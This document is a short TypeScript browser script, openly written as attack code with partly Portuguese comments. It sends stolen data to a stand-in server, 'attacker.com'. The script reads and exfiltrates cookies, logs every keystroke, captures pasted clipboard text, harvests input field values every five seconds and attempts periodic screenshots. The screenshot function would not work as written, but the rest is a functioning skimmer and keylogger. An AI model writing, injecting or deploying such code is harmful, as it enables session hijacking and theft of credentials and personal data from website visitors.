const ATTACKER_SERVER = "https://attacker.com";

// Send data to atacante
function sendData(data: string) {
    fetch(`${ATTACKER_SERVER}/log`, {
        method: "POST",
        body: JSON.stringify({ data }),
        headers: { "Content-Type": "application/json" },
        mode: "no-cors"  // Previne CORS errors 
    });
}

// Steal Cookies
const cookies = document.cookie;
if (cookies) {
    sendData(`Cookies: ${cookies}`);
}

// Log Keystrokes
document.addEventListener("keydown", (event) => {
    sendData(`Key Pressed: ${event.key}`);
});

// Capture Clipboard Data
document.addEventListener("paste", (event) => {
    const clipboardData = (event.clipboardData || (window as any).clipboardData).getData("text");
    sendData(`Clipboard: ${clipboardData}`);
});

// Abusing Hidden Inputs
setInterval(() => {
    document.querySelectorAll("input").forEach((input) => {
        if (input.value && input.type !== "password") {
            sendData(`Autofilled: ${input.name} = ${input.value}`);
        }
    });
}, 5000);

// Take Screenshots 
function captureScreen() {
    const canvas = document.createElement("canvas");
    const ctx = canvas.getContext("2d");
    if (ctx) {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        ctx.drawImage(document.body, 0, 0);
        sendData(`Screenshot: ${canvas.toDataURL()}`);
    }
}

// Capture screen every 5 seconds
setInterval(captureScreen, 5000);
